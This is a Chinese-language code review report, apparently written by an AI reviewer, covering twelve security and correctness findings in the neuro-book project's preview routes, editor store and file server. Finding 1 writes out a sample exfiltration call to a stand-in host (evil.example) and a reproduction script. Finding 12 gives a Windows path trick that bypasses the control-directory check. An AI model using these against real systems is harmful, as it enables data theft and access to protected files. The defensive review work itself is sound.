@@ -1,0 +1,142 @@
+# w00025 t02 实现审查（后端与领域）：Opus
+
+审查范围 `0e0126753..13bedd9af`，worktree `.worktree/w00025-t02-review`。按发现顺序追加，最后按严重程度汇总。
+
+### 1. 预览路由的响应不带任何 CSP：iframe 内导航到作品里另一个 `.html` 即绕过“默认不联网”，令牌外泄后还能在应用源里执行脚本
+
+- **严重程度**：阻断；**类别**：安全与性能
+- **位置**：`packages/neuro-book/src/plugins/files/backend/raw-route.ts:222-223`（`serveFile(..., {...cors, "Referrer-Policy": "no-referrer"})`）；`docs/specs/workspace/files.md:82`（“前五个响应头，`Content-Security-Policy: sandbox` 除外”）；`packages/neuro-book/src/plugins/html-preview/web/compose.ts:31-46`
+- **现象**：网络限制只靠 `composePreview` 往 `srcdoc` 里插的 `<meta http-equiv="Content-Security-Policy">`。预览路由给出的 HTML 响应没有 CSP 响应头。
+  1. 预览页里 `location.href = "other.html"`，或用户点一个指向作品里别的 `.html` 的普通链接（Spec 已知限制里承认会这样跳），iframe 加载的是预览路由直接给出的磁盘内容：没有注入的 meta CSP，也没有锚点脚本。iframe 的 `sandbox="allow-scripts"` 对后续导航仍然有效，所以它还是不透明源，但网络不受限：`fetch("https://evil.example", {method: "POST", body})` 可以发出，读到的作品文件（经 `<base>` 同一令牌、`Origin: null` 的 CORS）可以整批外发。CSP 的 `navigate-to` 浏览器没有实现，`form-action 'none'` 拦不住脚本改 `location`。
+  2. 令牌外泄后（上一步就能外发），任何网站都可以把用户顶层导航到 `http://127.0.0.1:<端口>/api/nbook.files/preview/<令牌>/evil.html`：`Host` 是回环、预览路由不看 `Sec-Fetch-Site`，响应是 `text/html` 且没有 `sandbox`，脚本在应用源里运行，能连 RPC（来源被允许）、能发写请求，等于沙箱完全失效。令牌在预览可见期间一直有效。
+- **为什么是问题**：违反 `docs/specs/workbench/html-preview.md` 的信任边界（第 74 行“默认不能联网”、输出 1 的沙箱）与验收 2（“`fetch` 一个外网地址被 CSP 拦下”只在 `srcdoc` 首页成立）。`raw` 路由加 `sandbox` 正是为了“直接打开一个 HTML 地址也不在应用源里运行”（`raw-route.ts:187`），预览路由给的同样是作品里的不受信任 HTML，却漏了这一层。
+- **如何核实**：起开发服务，在作品里放 `a.html`（`<a href="b.html">b</a>`）与 `b.html`（`<script>fetch("https://example.com/?x="+document.baseURI)</script>`），预览 `a.html` 点链接，DevTools 网络面板看到外网请求发出；把 `b.html` 的 iframe 地址复制到新标签页直接打开，`document.domain`/`location.origin` 是应用源。代码层面：`grep -n 'Content-Security-Policy' packages/neuro-book/src/plugins/files/backend/raw-route.ts` 只在 `RAW_HEADERS` 出现。
+- **建议改法**：预览路由的响应一律带 `Content-Security-Policy` 响应头：`sandbox allow-scripts` 加与 `contentSecurityPolicy(base, network)` 同一组网络指令。“允许联网”是窗口里的状态，服务端不知道：把它并进令牌（`open({project, generation, network})`，切换联网时换令牌，本来就要重载），由路由按令牌给头；`compose.ts` 的 meta 可以保留作双保险，也可以删掉让部件变少。改 `files.md` 第 82 行“`sandbox` 除外”的写法，`raw-route.test.ts` 的预览用例补断言。
+
+### 2. 没有 `Host` 头（或 `Host` 为空）的请求在 `Host` 核对之前就抛错，得到 500 并记一条错误诊断，而不是 421
+
+- **严重程度**：建议；**类别**：正确性
+- **位置**：`packages/neuro-book/src/plugins/http/backend/dispatch.ts:86-88`（`const url = new URL(request.url)` 是分发的第一句）；兜底在 `http/backend/plugin.ts:80-83` 的 `error`
+- **现象**：Bun 收到 `GET /x HTTP/1.0`（不带 `Host`）或 `Host:` 为空的请求时，`request.url` 是相对地址 `/x`，`new URL("/x")` 抛 `TypeError: Invalid URL`。异常从分发器抛出，落到 `Bun.serve` 的 `error` 回调：`reportError` 记一条 `plugin: null` 的错误诊断，回 500 `internal-error`。HTTP/1.1 不带 `Host` 时 Bun 自己回 400，不进分发器。
+- **为什么是问题**：Spec（`docs/specs/runtime/server-host.md:57-58`）要求 `Host` 不是回环名时 421 `misdirected-host`；缺 `Host` 应归入这一条。现在的结果仍然拒绝了请求（安全上无害），但每个这样的请求都在诊断里留一条“处理请求时出错”的错误记录，任何本机进程都能刷出来，掩盖真正的处理器异常。本次把 `new URL` 挪到准入之前，倒是顺带消除了 base 上“取了准入票据再抛错、票据不归还”的问题。
+- **如何核实**：`lab/opus/host.ts`（`bun host.ts`）：Bun 1.4.2 下 HTTP/1.0 无 `Host` 与空 `Host` 两种请求，处理器里 `request.url` 都是 `/x`，`new URL` 抛错。`dispatch.test.ts` 没有这一类用例。
+- **建议改法**：`rejected` 改为先 `URL.canParse(request.url)`，不能解析即 421（或 400）；`new URL` 放进 `rejected` 之后。`dispatch.test.ts` 的来源核对一组补一条（`new Request` 构不出无 Host 的请求，可用真实 `Bun.serve` 加原始套接字，或直接构造 `{url: "/x", headers, method}` 形状的请求对象）。
+
+### 3. 文本换字节时，“别处还有可编辑标签”的判断把还没取引用的恢复标签也算进去，随后直接释放最后一个文本引用，未保存的正文被 `stopText` 清掉
+
+- **严重程度**：重要；**类别**：正确性
+- **位置**：`packages/neuro-book/src/plugins/editor/web/area.ts:481-496`（`changeEditor`）；`documents/store.ts:415-428`（`stopText`）、`672-680`（`release`）
+- **现象**：`changeEditor` 从文本换到字节前，用 `groups...some(other => other.id !== tab.id && other.address === tab.address && editable(other))` 判断“还有别的能编辑的标签”，有就不拒绝。但这些标签不一定持有引用：会话恢复出来、还没成为活动标签的标签没有引用（`referenceOf` 的注释）。之后第 491-495 行直接 `reference.release()`，没有像 `releaseTab`（第 174-179 行）那样先替同地址未取引用的标签拿上引用。结果 `textRefs` 降到 0、还剩刚取的字节引用，`release` 调 `stopText`：`text`、`saved`、`baseline`、未裁决输入全部清空。
+  - 复现路径：会话里组 A、组 B 都有 `logo.svg` 的源码标签，B 里它不是活动标签（恢复后没取引用）；在 A 里编辑不保存；在 A 里“用其它编辑器重新打开”选图片查看器。判断看到 B 的标签可编辑，放行；A 的修改无提示丢失。之后激活 B 的标签，读到的是磁盘内容。
+- **为什么是问题**：违反输出 4 与第 474-475 行注释自己写的不变量（“放掉最后一个文本引用会丢掉没保存的正文”时要拒绝）。同一文件里 `closeTab`、`open` 的 preview 替换、`setEditor` 合并都走 `releaseTab`，只有这条路径绕开了它。
+- **如何核实**：`area.test.ts` 加一条：用带两组、B 组同地址源码标签非活动的 `initial` 会话建编辑器区（文件是 `.svg`，目录里同时登记图片查看器的 bytes 声明），A 组 `commit` 一段修改后 `reopenWith("nbook.image-viewer")`，断言返回 `ok: false` 或 `documents.get(address)` 的正文仍在、`rescue()` 列得出它。按现状会得到 `ok: true` 且正文为空。
+- **建议改法**：把 `releaseTab` 里“替同地址未取引用的标签拿上引用”抽成一个函数，`changeEditor` 的换引用分支先调它再 `reference.release()`；或者让判断与实际引用一致：用 `documents` 暴露的文本引用数代替按标签列表推断。前者改动最小，也顺带让旧编辑器的视图状态槽按 `releaseTab` 的规则收掉（现在这条路径不调 `dropSlot`，旧编辑器的槽只能等最近列表淘汰）。
+
+### 4. 贡献方在发布之前失败（激活抛错、暂存后激活失败）时，编辑器停在“未交付”的进度、语言的等待 Promise 永不 settle
+
+- **严重程度**：建议；**类别**：不变量
+- **位置**：`packages/neuro-book/src/plugins/editor/web/editor-registry.ts:44-50`、`61`；`packages/neuro-book/src/plugins/editor/web/code/languages.ts:76-82`、`125-130`；内核 `packages/nb-runtime/src/plugins/host.ts:1484-1497`
+- **现象**：两个注册表只在 `published` 之后见过的句柄上把撤回记成“不在了”（`if (this.#published.get(handle.id) !== handle) return`）。内核对“暂存成功、贡献方激活随后失败”的项会调 `revoke(handle, prepared, "activation-failed")`，这时句柄从没发布过，两边都直接忽略；贡献方 `activate` 自己抛错时则根本没有暂存项，接收方收不到任何回调。结果：
+  - `EditorRegistry.state` 一直是 `pending`，这个编辑器的标签过 800ms 后一直显示进度，没有“这个编辑器已经不在了 / 用默认编辑器打开”；
+  - `LanguageRegistry.#load` 把 resolver 放进 `#waiting` 后永远等不到 `#settle`：Monaco 的分词工厂 `create` 一直挂着，这门语言与嵌入它的语言一直按纯文本显示，没有诊断。每门语言至多挂两个 resolver（分词工厂一次、`onLanguageEncountered` 一次），所以不是无界泄漏，问题在于可观察的“永远在等”。
+- **为什么是问题**：输出 40 只区分“不在了”“未交付”“已交付”，没有说“贡献方坏了”该落在哪一档；按计划第 1 节，“贡献方停止”属于“不在了”。现在激活失败的编辑器卡在“未交付”，用户没有出路（“用默认编辑器打开”只在 gone 时出现）。
+- **如何核实**：`editor-registry.test.ts` 补一条：用真实内核装一个 `activate` 在暂存后失败的贡献方（`plugins.test.ts` 已有这种夹具写法），断言 `state(id).kind` 为 `gone`。按现状为 `pending`。
+- **建议改法**：`revoke` 不再要求句柄已发布：任何 `reason` 为 `activation-failed`/`activation-stopped`/`delivery-failed` 的撤回都记入 `#stopped` 并 settle 等待者（`published` 时照常移出）。`activate` 直接抛错的一类收不到回调，要么接受并在 Spec 写明，要么让编辑器区在“未交付”超过一段时间后也给“用默认编辑器打开”的出路。
+
+### 5. 语言撤回期间 Monaco 来要过分词规则，之后再交付不再生效，直到刷新页面
+
+- **严重程度**：建议；**类别**：正确性
+- **位置**：`packages/neuro-book/src/plugins/editor/web/code/languages.ts:104-109`（`registerTokensProviderFactory`、`onLanguageEncountered`）、`125-130`
+- **现象**：`install` 给每门语言登记一次分词工厂。Monaco 的 `TokenizationSupportFactoryData.resolve()`（`node_modules/monaco-editor/esm/vs/editor/common/tokenizationRegistry.js:108-120`）只调一次工厂，结果为 null 时把工厂标为已解决，`getOrCreate` 之后对这门语言一律返回 null；`onLanguageEncountered` 也只触发一次。所以语言在撤回状态（`#stopped`）或加载失败时被打开过一次，工厂得到 null，之后同一语言再交付（`published` 清掉 `#stopped`）不会让 Monaco 重新来要，这门语言在本页里一直是纯文本、编辑规则（括号、注释）也没有。
+- **为什么是问题**：类注释与 Spec 输出 43–45 承诺“撤回了的为 null，这门语言按纯文本显示”，隐含“再交付后恢复”；`#loads` 按句柄缓存、`published` 清 `#stopped` 也是为再交付准备的，但 Monaco 那一侧不会再问，这些状态没有消费者。开发模式下插件重载、贡献方停止再启动都会碰到。
+- **如何核实**：从代码推断（需要真实浏览器）：e2e 里先让语言贡献方停止，打开该语言的文件，再启动贡献方，看同一标签与新开标签是否着色；或在 `languages.ts` 里对 Monaco 的 `TokenizationRegistry` 做真实调用的单测。
+- **建议改法**：`published` 时若这门语言已 `#installed`，且之前给 Monaco 的是 null，重新 `registerTokensProviderFactory(id, …)`（Monaco 会替换工厂并发出变化事件、重新分词）并补设 `setLanguageConfiguration`；需要在类里记下 `monaco` 实例与“给过 null”的语言集合。或者明确接受“撤回后要刷新页面”，写进 Spec 的已知限制，删掉 `#stopped` 被清除这类无人消费的状态。
+
+### 6. 语言 id 的贡献校验没有长度上限，会话记录却限 64 字符：选了长 id 的语言后整份会话记录写不进去
+
+- **严重程度**：建议；**类别**：正确性
+- **位置**：`packages/neuro-book/src/plugins/editor/shared/contracts.ts:158`（`LANGUAGE_ID = /^[a-z][a-z0-9_.-]*$/u`）；`packages/neuro-book/src/plugins/editor/web/session-record.ts:38`（`language` 的 `pattern: "^[A-Za-z0-9][A-Za-z0-9_.+-]{0,63}$"`）
+- **现象**：贡献点接受任意长度的语言 id（内核对贡献 id 也没有长度限制，`nb-runtime/src/plugins/registration.ts` 只拒空 id）。用户经 `change-language` 选了一门 id 超过 64 字符的语言后，`groups.setLanguage` 记到标签上，`editorSessionStore.save` 提交的快照不过记录 schema，保存失败、队列暂停；`save` 之后只把最新快照记进 `latest`，`retry` 重发的仍含这个 id，会话记录（标签、光标、布局）在这个窗口里再也写不进去，直到标签关掉或换语言。
+- **为什么是问题**：两处对同一个值的合法范围不一致，失败落在与语言无关的会话保存上，用户看到的是“会话保存失败”。现在内置的 Monaco 语言最长 41 字符（`freemarker2.tag-bracket.interpolation-bracket`），第三方插件才会踩到。
+- **如何核实**：`languages.test.ts` 里 `validateLanguageContribution(contribution("a".repeat(80), {aliases: ["A"]}))` 返回 null；再用 `Value.Check(SessionSchema, …)` 带这个 `language` 的标签为假。
+- **建议改法**：在 `LANGUAGE_ID` 上加长度上限 `{0,63}`，让贡献校验与记录一致（只改一处）；记录的 pattern 也收紧为与 `LANGUAGE_ID` 相同的字符集，避免两份正则以后再漂移，最好让记录直接引用同一个常量。
+
+### 7. `reopen-with` 在异步选择之后只核对活动标签，不核对编辑器区本身还在；编辑器区在选择期间被换掉时，对已释放的仓库新开文件订阅且永不释放
+
+- **严重程度**：建议；**类别**：不变量
+- **位置**：`packages/neuro-book/src/plugins/editor/web/commands.ts:155-173`（`REOPEN_WITH_COMMAND`）、`176-197`（`CHANGE_LANGUAGE_COMMAND`）；`area.ts:669-686`（`reopenWith`、`reopenWithDefault` 不看 `disposed`，`open`、`openPage` 看）；`documents/store.ts:650-661`（`acquire` 不看 `disposed`）
+- **现象**：base 上 `reopen-with` 是同步的；现在不带参数时要 `await sources.pick.pick(...)`。选择期间窗口解绑或换绑项目，`session.dispose()` 释放旧编辑器区（`area.value = null`、`documents.dispose()` 清空条目与订阅）。选择返回后命令仍拿着捕获的 `current`：`current.groups.activeTab()` 还是原来的标签（组模型没有清空），核对通过，`reopenWith` → `changeEditor`。文本与字节之间换时走 `referenceOf` → `documents.acquire`：已释放的仓库里没有条目，新建一份，`watchFor` 因 `watches` 已清空而重新 `files.watch(scheme, …)`。这条远程订阅的回调因 `disposed` 直接返回，但订阅本身没有人再释放，跟着窗口的文件客户端一直挂着。
+- **为什么是问题**：违反“编辑器区释放后不再持有资源”的收口不变量；也把“选择期间目标变了要 `stale-target`”（输出 45 写给 change-language，reopen-with 同理）只做了一半。
+- **如何核实**：从代码推断。`area.test.ts` 可复现：建编辑器区、打开 `a.md`，`dispose()` 后调 `reopenWith("nbook.editor.code")` 与一个 bytes 编辑器，数 `files.watch` 被调用的次数（测试里的文件客户端是真实 `createFilesClient` 的话看它的订阅数）。
+- **建议改法**：两条命令在 `await` 之后先比 `area.value !== current`，不同则 `stale-target`；`area.ts` 的 `reopenWith`、`reopenWithDefault`、`split` 与 `open` 一样先看 `disposed`；`documents.acquire` 在 `disposed` 时抛 `RangeError`（与 `live` 一致），让这类误用立刻暴露而不是静默泄漏。
+
+### 8. `stopText` 不管在途保存：保存中选“不保存”关掉最后一个文本标签、还剩字节标签时，保存回来把条目写成“已保存 foo、正文空”，之后再打开文本并保存会把文件写空
+
+- **严重程度**：重要；**类别**：正确性
+- **位置**：`packages/neuro-book/src/plugins/editor/web/documents/store.ts:415-428`（`stopText`）、`535-558`（`saveNow` 写成功后无条件改 `baseline`、`saved`，`unknown-outcome` 时记 `uncertain`）、`403-412`（`startText` 在 `saved !== null` 时不回到 loading）；`area.ts:511-531`（`closeTab` 的“不保存”）
+- **现象**：`closeTab` 在文档 `saving` 时也会询问（`needsSettle` 含 `saving`），用户选“不保存”就 `break` 并释放引用。同一文件还有字节标签（例如 `logo.svg` 同时开着图片查看器）时，释放走到 `stopText`：清掉 `text`、`saved`、`baseline`。但在途的 `saveNow` 还在 `await files.write`，回来后执行 `entry.baseline = result.value.baseline; entry.saved.value = text`（第 537-538 行），条目变成“只有字节引用、`saved` 为旧正文、`text` 为空”，`isDirty` 为真：
+  - 字节标签显示 dirty，`hasUnsavedDocuments` 为真，窗口关闭时询问，`rescue()` 把空串当作未保存正文列出；
+  - 之后对同一地址再开文本标签：`startText` 因 `saved !== null` 不回到 loading，`read` → `apply` 走到 `baseline.hash === entry.baseline?.hash` 直接返回，正文仍是空串且 dirty；此时保存会把磁盘上的文件写成空文件。
+  - `unknown-outcome` 分支同理：`uncertain` 留在条目上，`recheck` 因 `textRefs === 0` 不读，下次文本引用来了按 `uncertain` 改 `saved`，正文仍空。
+- **为什么是问题**：输出 41 要求“最后一个文本标签关闭后（需要结算的正文已按第 4 条结算）条目丢掉正文，只按字节”。“选了不保存但保存已经在路上”不是“已结算”；`stopText` 假设了没有在途保存，而 `closeTab` 不保证这一点。base 上同样的路径是 `drop`（`closed` 为真，`saveNow` 之后的写对已丢弃条目无害），所以这是本次引入的回归。
+- **如何核实**：`documents.test.ts` 加一条：用场地的 `tap` 扣住写入，`acquire(svg, {text: false})` 与文本引用各一份，文本里 `commit` 后 `save`，在写入被扣住时释放文本引用，再放行写入；断言字节引用的文档 `dirty.value` 为假、`saved` 被清空。按现状 `dirty.value` 为真。
+- **建议改法**：让“丢正文”与保存串行：`stopText` 挂在 `entry.queue` 之后执行（`entry.queue = entry.queue.then(() => { if (entry.textRefs === 0 && !entry.closed) stopText(entry); })`），或者在 `saveNow` 写回 `baseline`/`saved`、记 `uncertain` 之前检查 `entry.textRefs === 0` 并放弃写回。前者把“文本引用归零”当作一次排队的状态变化，部件最少。另把 `startText` 的“是否已有正文”判据从 `saved !== null` 改为显式的“正文是否在”，避免任何遗留的 `saved` 让新文本引用跳过加载。
+
+### 9. 只有字节引用的条目 `writable` 为真，测试把这一点断言成了合同，与计划和输出 41 的“不可写”相反
+
+- **严重程度**：建议；**类别**：测试
+- **位置**：`packages/neuro-book/src/plugins/editor/documents.test.ts`（输出 41 一组第一条，`expect([document.text.value, document.dirty.value, document.writable.value]).toEqual(["", false, true])`）；`documents/store.ts:367`（`writable: computed(() => status.value === "ready" && ended.value === null)`）
+- **现象**：计划第 3 节写“只有字节引用的条目……`writable` 为假”，Spec 输出 41 写“它不 dirty、不可写”。实现没有按 `textRefs` 改 `writable`，测试照实现写成了 `true`。公开状态 `writable` 经 `viewWritable` 另判 `editable(tab)`，所以界面上不受影响；但 `documents.get(address)` 交出的 `TextDocument` 对内部调用方（`area.ts:386`、`EditorGroup.vue:66`）说“可写”，`commit` 也会接受写入（只看 `status`），把一份没有正文的条目改成有正文。
+- **为什么是问题**：测试把与 Spec 相反的行为固定下来，以后按 Spec 修正时测试会先失败，读测试的人会以为“可写”是合同。
+- **如何核实**：读上面两处即可；改 `writable` 为 `status === "ready" && ended === null && textRefs > 0` 后这条测试失败。
+- **建议改法**：`writable` 依赖一个响应式的文本引用数（把 `textRefs` 改成 `ref`），只剩字节引用时为假；`commit` 在 `textRefs === 0` 时回 `stale`；测试断言改为 `false`。
+
+### 10. 字节与预览路由的热路径：每个请求读一遍登记表文件；内容整段读进内存（至多 32 MiB），并发无上限；HEAD 也读全文
+
+- **严重程度**：建议；**类别**：安全与性能
+- **位置**：`packages/neuro-book/src/plugins/files/backend/raw-route.ts:119-121`（`open` 每次 `await sources.projects.list()`）、`160-176`（`serveFile`）；`server/projects/registry.ts:59-62`（`list` 即 `read`：`readFile` 加解析）；`server/projects/manager.ts:183-199`
+- **现象**：
+  1. `createProjectRoots.open` 为核对“这一代在运行”每个请求调 `projects.list()`，项目管理器的 `list` 每次从磁盘读登记表 JSON、解析、校验，再逐项查运行状态。预览一个引用了几十张图、几个脚本与字体的 HTML，每个子资源都触发一次；图片查看器每次 `version` 变化也触发一次。真正要的只是内存里的“id 的当前代次与状态”。
+  2. `root.read(path, RAW_MAX_BYTES)` 把文件整段读进 `Uint8Array` 再交给 `Response`。几个 20 MiB 的 PNG 同时加载（例如资源管理器里快速连点、或预览页里一组大图）就是几个 20 MiB 的常驻缓冲，路由层没有并发上限。`handle.readFile()` 读到 EOF 为止，`fstat` 之后文件还在增长时读到的会超过上限。
+  3. `HEAD` 与 `GET` 走同一个处理器，`HEAD` 也完整读一遍内容再由 Bun 丢掉正文。
+- **为什么是问题**：审查维度 5 要求热路径上没有可省的扫描、没有无界读取。这条路由在预览与图片查看里是最频繁的请求。
+- **如何核实**：在 `raw-route.test.ts` 的 `projects.list` 夹具里计数，预览一页 N 个资源后计数为 N；`HEAD /raw/user/note.txt` 时给 `openRoot` 包一层计数 `read` 的调用。
+- **建议改法**：项目登记服务给一个只看内存的查询（`manager.running(id)` 已有，经 `ProjectsService` 暴露为 `runningGeneration(id)`），`list()` 只在缓存的根失效时调；读内容改为按已核对的文件句柄流式返回（`handle.readableWebStream()` 或 `Bun.file` 配合 `fstat` 的大小核对，读够 `size` 就停），`HEAD` 只回头部。若保持整段读入，至少在 `serveFile` 外加一个简单的并发闸门。
+
+### 11. （base 已有，非本次回归）preview 标签被替换时不询问：关掉 dirty 的正式标签时因“别处还有 preview 标签”不问，之后替换掉那个 preview 标签即静默丢弃正文
+
+- **严重程度**：建议；**类别**：正确性
+- **位置**：`packages/neuro-book/src/plugins/editor/web/area.ts:568-569`（`open` 里 `replaced` 直接 `releaseTab`）、`523-524`（`closeTab` 的 `shared` 把 preview 标签算作可编辑）；base `0e0126753` 的 `area.ts:543-544` 相同
+- **现象**：组 1 里 `a.md` 是 preview 标签（单击打开），组 2 里 `a.md` 是正式标签并有未保存修改。关组 2 的标签：`shared` 为真（组 1 的 preview 标签可编辑），不问。之后在组 1 单击另一个文件，preview 标签被替换，`releaseTab` 放掉最后一个引用，`drop` 丢弃 dirty 正文，不询问。
+- **为什么是问题**：Spec 输出 4 明写“关闭文档的最后一个标签、或 preview 替换掉它时，文档 dirty 或有未裁决输入就询问”。本次改动把“可编辑”收紧到非预览编辑器，但没有覆盖 preview 标签替换这条路径。
+- **如何核实**：`area.test.ts`：两组、组 1 preview 打开 `a.md`、组 2 permanent 打开并 `commit`，关组 2 标签后在组 1 `open("project://b.md", {mode: "preview"})`，断言 `dialog` 出现或 `rescue()` 仍有 `a.md`。
+- **建议改法**：`open` 在有 `replaced` 且它是这份文档最后一个持有引用的标签、文档需要结算时，不替换而是新插一个标签（VS Code 的做法：dirty 的 preview 标签自动转正），或者沿用 `closeTab` 的询问。最省事的是“文档 dirty 时它的所有 preview 标签转正”，替换路径就碰不到 dirty 文档。
+
+### 12. （base 已有，经新路由多了一个出口）Windows 上 `.nbook.`、`.nbook ` 与 8.3 短名可以绕过控制目录判定
+
+- **严重程度**：建议；**类别**：安全与性能
+- **位置**：`packages/neuro-book/src/plugins/files/backend/rooted.ts:74-76`（`isControlName` 只比 `name.toLowerCase() === ".nbook"`）、`133`、`161`；本范围内 `rooted.ts` 未改
+- **现象**：NTFS 打开路径时会去掉段尾的点与空格，`.nbook.`、`.nbook ` 指向 `.nbook`；8.3 短名（如 `NBOOK~1`）同样指向它。`resolve` 逐段 `lstat` 成功、不是符号链接，`current` 保留词法上的名字，`realPath` 不是 `.nbook`，两处控制目录判定都放行。`GET /api/nbook.files/raw/project/<id>/<代次>/.nbook./project.json` 在 Windows 上会读到控制目录里的文件（预览路由同理，且接受跨站）。
+- **为什么是问题**：`files.md` 规定控制目录一律 404；`raw-route.test.ts` 只在 Linux 上验了 `.nbook/project.json`。文件服务的远程合同 base 上就有同样的出口，本次只是多了 HTTP 这条。
+- **如何核实**：从代码推断，未在 Windows 上验证。
+- **建议改法**：`resolve` 在 win32 上拒绝以点或空格结尾的段、含 `~` 后跟数字的段（与已有的“Windows 上不能含 `:`”同一处），或在逐段解析后用 `realpath` 的结果（Windows 上会给出规范长名）做控制目录判定。
+
+## 未发现问题的方面
+
+- 字节路由的路径解码与根约束：`decodePath` 解出的 `%2F`、`..` 都被 `pathProblem` 拒绝；符号链接逐段 `realpath` 后限在根内；`.nbook` 大小写不敏感地拒绝；空路径、目录、悬空链接为 404；`rawUrlOf` 逐段编码。仔细检查后没有发现 Linux 上的绕过。
+- 413 在读内容之前判（打开后 `fstat` 的大小）；检查与读取之间被替换由 `dev`/`ino` 核对挡住；304 的 ETag 用 `resolve` 的 `stat`、200 用打开后的 `fstat`，两者一致；`user://` 根是服务端入口激活时打开的同一个。
+- 代次核对：`list()` 里代次不符或状态不是 running、idle-grace 即 410 并丢弃缓存的根；身份文件每代第一次打开时核对，打开失败不缓存；根目录被换由 `Root` 逐请求核对。
+- 令牌：128 位随机、按门面记账，`close` 只作废自己签的，门面释放全部作废；代次结束的令牌在下一次使用时作废，代次号不复用，等价于立即作废。
+- `Host` 与 `Origin`：在准入之前、对所有路由生效；`URL.hostname` 已小写、IPv6 带方括号、端口不影响；`Origin: null` 的写请求 403；`allowOrigin` 与 RPC 端口同一个闭包；`NBOOK_ALLOWED_ORIGINS` 只能是回环来源，所以 Spec 里“或 `NBOOK_ALLOWED_ORIGINS` 里的主机”与只认回环名等价。
+- 选编辑器：多段后缀取最长、大小写不敏感、整个文件名就是扩展名（`.md`）不算命中、`filenames` 优先、同级按 id 取第一个并记诊断；二进制表只在没有任何 selector 命中时生效，与 Spec 输出 37 一致。
+- 会话记录：旧值 `markdown`、`code` 读出时换成新 id；编辑器 id 的 pattern 与 `PAGE_ID` 一致；恢复时光标按声明的写法过滤。
+- `change-language` 与 `reopen-with` 在选择之后核对活动标签的 id 与编辑器（编辑器区本身被换掉的情况见第 7 条）。
+- 生成脚本：`new Function` 执行的是已装依赖里的 contribution 文件，信任等级与应用打包进去的同一份代码相同；import 行与 `loader` 写法不符时抛错，`languages.test.ts` 逐字比对生成结果，升级 Monaco 忘了重新生成会被测试拦下。没有发现需要换做法的理由；`plaintext`、`json` 被贡献校验拒绝，生成表里也没有它们。
+
+## 各级数量
+
+- 阻断：1（第 1 条）
+- 重要：2（第 3、8 条）
+- 建议：9（第 2、4、5、6、7、9、10、11、12 条；其中第 11、12 条是 base 已有）
+
+补充说明：第 1 条里“别的网站顶层导航到预览地址”这一步，在对公网页面导航到本机地址加了拦截（Private Network Access 的导航限制）的浏览器版本里会被挡住；iframe 内导航绕过“默认不联网”这一步不受影响，单独就构成阻断。
